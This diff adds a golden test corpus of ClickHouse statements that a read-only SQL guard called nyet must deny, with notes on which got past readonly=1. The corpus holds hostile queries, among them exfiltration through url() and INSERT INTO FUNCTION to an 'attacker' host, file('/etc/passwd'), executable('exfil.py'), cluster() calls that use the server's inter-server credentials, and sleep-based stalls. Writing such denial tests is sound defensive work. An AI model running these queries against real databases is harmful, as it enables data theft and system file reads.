@@ -1,0 +1,286 @@
+# Golden corpus — statements that must be DENIED (ClickHouse dialect).
+# reason is from the closed list: PARSE_FAILED | MULTI_STATEMENT |
+# WRITE_OPERATION | TXN_CONTROL | LOCKING_CLAUSE | DENIED_FUNCTION |
+# EXPLAIN_ANALYZE | WIRE_FORMAT.
+#
+# W9 (August 2026). ClickHouse's own `readonly = 1` already refuses most of
+# this — it is the strongest layer 2 nyet has, and it counts table functions as
+# writes. The cases below are here anyway, and the ones marked MEASURED are the
+# ones where layer 2 does NOT hold.
+
+# --- writes and DDL: sqlparser gives them their own Statement variants ---
+- query: INSERT INTO events VALUES (1)
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: INSERT INTO events SELECT * FROM staging
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: INSERT INTO FUNCTION url('http://attacker/', CSV, 'a UInt32') SELECT user_id FROM events
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: INSERT INTO FUNCTION remote('other:9000', default.events) SELECT 1
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: TRUNCATE TABLE events
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: DROP TABLE events
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: RENAME TABLE events TO events_old
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: CREATE TABLE t (a Int32) ENGINE = MergeTree ORDER BY a
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: CREATE VIEW v AS SELECT 1
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: OPTIMIZE TABLE events FINAL
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: GRANT SELECT ON *.* TO someone
+  verdict: deny
+  reason: WRITE_OPERATION
+- query: USE other_database
+  verdict: deny
+  reason: WRITE_OPERATION
+
+# --- writes ClickHouse spells in ways sqlparser does not parse at all ---
+# Fail-closed is the WHOLE point here: a mutation nyet cannot read is a
+# mutation nyet refuses. These are ClickHouse's real UPDATE and DELETE.
+- query: ALTER TABLE events DELETE WHERE user_id = 1
+  verdict: deny
+  reason: PARSE_FAILED
+- query: ALTER TABLE events UPDATE user_id = 2 WHERE user_id = 1
+  verdict: deny
+  reason: PARSE_FAILED
+- query: ALTER TABLE events DROP PARTITION 202601
+  verdict: deny
+  reason: PARSE_FAILED
+- query: ALTER TABLE events MODIFY SETTING index_granularity = 1
+  verdict: deny
+  reason: PARSE_FAILED
+- query: DETACH TABLE events
+  verdict: deny
+  reason: PARSE_FAILED
+- query: ATTACH TABLE events
+  verdict: deny
+  reason: PARSE_FAILED
+- query: EXCHANGE TABLES events AND staging
+  verdict: deny
+  reason: PARSE_FAILED
+- query: SYSTEM RELOAD DICTIONARIES
+  verdict: deny
+  reason: PARSE_FAILED
+- query: SYSTEM FLUSH LOGS
+  verdict: deny
+  reason: PARSE_FAILED
+- query: SYSTEM DROP QUERY CACHE
+  verdict: deny
+  reason: PARSE_FAILED
+- query: KILL QUERY WHERE query_id = 'x'
+  verdict: deny
+  reason: PARSE_FAILED
+- query: KILL MUTATION WHERE 1
+  verdict: deny
+  reason: PARSE_FAILED
+- query: BACKUP TABLE events TO Disk('backups', 'x')
+  verdict: deny
+  reason: PARSE_FAILED
+- query: RESTORE TABLE events FROM Disk('backups', 'x')
+  verdict: deny
+  reason: PARSE_FAILED
+- query: CREATE DICTIONARY d (a Int) PRIMARY KEY a SOURCE(HTTP(url 'http://attacker/'))
+  verdict: deny
+  reason: PARSE_FAILED
+- query: CREATE FUNCTION f AS x -> x + 1
+  verdict: deny
+  reason: PARSE_FAILED
+- query: WATCH live_view
+  verdict: deny
+  reason: PARSE_FAILED
+
+# --- session / settings control ---
+- query: SET max_threads = 8
+  verdict: deny
+  reason: TXN_CONTROL
+- query: SET readonly = 0
+  verdict: deny
+  reason: TXN_CONTROL
+# A per-query SETTINGS clause is `SET` wearing a query's clothes. It is refused
+# even for a harmless setting: the rule is "nyet owns the settings", not "nyet
+# guesses which settings are dangerous". Layer 2 agrees — measured on 24.8,
+# readonly=1 answers "Cannot modify 'max_threads' setting in readonly mode".
+- query: SELECT * FROM events SETTINGS max_threads = 8
+  verdict: deny
+  reason: TXN_CONTROL
+- query: SELECT * FROM events SETTINGS readonly = 0
+  verdict: deny
+  reason: TXN_CONTROL
+- query: SELECT * FROM events SETTINGS max_result_rows = 100000000
+  verdict: deny
+  reason: TXN_CONTROL
+
+# --- the wire format is nyet's, not the query's ---
+- query: SELECT * FROM events FORMAT JSON
+  verdict: deny
+  reason: WIRE_FORMAT
+- query: SELECT * FROM events FORMAT CSV
+  verdict: deny
+  reason: WIRE_FORMAT
+
+# --- MEASURED PAST LAYER 2 (readonly = 1 did not stop these) ---
+# `cluster()` and `clusterAllReplicas()` RETURNED ROWS inside readonly=1: they
+# dial every node of a named cluster with the server's inter-server
+# credentials. The sharpest finding of the W9 pass.
+- query: SELECT * FROM cluster('default', system.one)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM clusterAllReplicas('default', system.one)
+  verdict: deny
+  reason: DENIED_FUNCTION
+# Reached SQLite's own "must be inside user_files" check, not the readonly one.
+- query: SELECT * FROM sqlite('/var/lib/clickhouse/user_files/x.db', 't')
+  verdict: deny
+  reason: DENIED_FUNCTION
+# Reached its argument validation inside readonly=1: it picks a table function
+# by privilege. sqlparser cannot parse its `SELECT ... ELSE ...` form at all, so
+# what refuses this spelling is fail-closed; the denylist entry is what catches
+# the form sqlparser CAN parse, below.
+- query: SELECT * FROM viewIfPermitted(SELECT 1 ELSE null('x UInt8'))
+  verdict: deny
+  reason: PARSE_FAILED
+- query: SELECT * FROM viewIfPermitted('x')
+  verdict: deny
+  reason: DENIED_FUNCTION
+# The dictionary family tried the lookup inside readonly=1. A dictionary may be
+# defined with SOURCE(HTTP(...)) or SOURCE(EXECUTABLE(...)), so a cold dictGet
+# is an outbound request or a spawned process.
+- query: SELECT dictGet('d', 'a', toUInt64(1))
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT dictGetOrDefault('d', 'a', toUInt64(1), 0)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT dictGetString('d', 'a', toUInt64(1))
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT dictHas('d', toUInt64(1))
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT dictIsIn('d', toUInt64(1), toUInt64(2))
+  verdict: deny
+  reason: DENIED_FUNCTION
+# sleep(0.1) and sleepEachRow RAN inside readonly=1 — the pg_sleep class.
+- query: SELECT sleep(3)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT sleepEachRow(1) FROM numbers(1000)
+  verdict: deny
+  reason: DENIED_FUNCTION
+# The SCALAR file() reached the user_files path check, not the readonly check.
+- query: SELECT file('/etc/passwd')
+  verdict: deny
+  reason: DENIED_FUNCTION
+# Reached its argument-count check: it evaluates a model out of process.
+- query: SELECT catboostEvaluate('/models/m.bin', 1, 2)
+  verdict: deny
+  reason: DENIED_FUNCTION
+# Exposes a MergeTree part's index granules — column VALUES without naming a
+# column, the pg_stats class. It ran inside readonly=1.
+- query: SELECT * FROM mergeTreeIndex(default, events)
+  verdict: deny
+  reason: DENIED_FUNCTION
+# Introspection functions: barred by allow_introspection_functions = 0, which
+# is a setting the server owner may have flipped — not by readonly.
+- query: SELECT addressToLine(1)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT demangle('x')
+  verdict: deny
+  reason: DENIED_FUNCTION
+
+# --- denied on class: egress and remote code (layer 2 refused these here) ---
+- query: SELECT * FROM url('http://attacker/steal', CSV, 'a String')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM urlCluster('default', 'http://attacker/', CSV, 'a String')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM file('data.csv')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM s3('https://bucket.s3.amazonaws.com/k.csv', 'CSV')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM s3Cluster('default', 'https://bucket.s3.amazonaws.com/k.csv', 'CSV')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM gcs('https://storage.googleapis.com/b/k', 'CSV')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM azureBlobStorage('c', 'b', 'k')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM hdfs('hdfs://nn:9000/x', 'CSV')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM iceberg('https://bucket/x')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM deltaLake('https://bucket/x')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM hudi('https://bucket/x')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM remote('other:9000', default.events)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM remoteSecure('other:9440', default.events)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM executable('exfil.py', TSV, 'a String')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM mysql('other:3306', 'db', 't', 'u', 'p')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM postgresql('other:5432', 'db', 't', 'u', 'p')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM mongodb('other:27017', 'db', 'c', 'u', 'p', 'a String')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM redis('other:6379', 'k', 'k String')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM jdbc('ds', 't')
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT * FROM odbc('conn', 't')
+  verdict: deny
+  reason: DENIED_FUNCTION
+
+# --- the denylist is not fooled by case or by a database qualifier ---
+- query: SELECT * FROM CLUSTER('default', system.one)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT SLEEP(3)
+  verdict: deny
+  reason: DENIED_FUNCTION
+- query: SELECT system.sleep(3)
+  verdict: deny
+  reason: DENIED_FUNCTION
+
+# --- the rest of the layer-1 rules hold on this dialect too ---
+- query: SELECT 1; SELECT 2
+  verdict: deny
+  reason: MULTI_STATEMENT
+- query: SELECT * FROM events WHERE
+  verdict: deny
+  reason: PARSE_FAILED
+- query: EXPLAIN ANALYZE SELECT * FROM events
+  verdict: deny
+  reason: EXPLAIN_ANALYZE
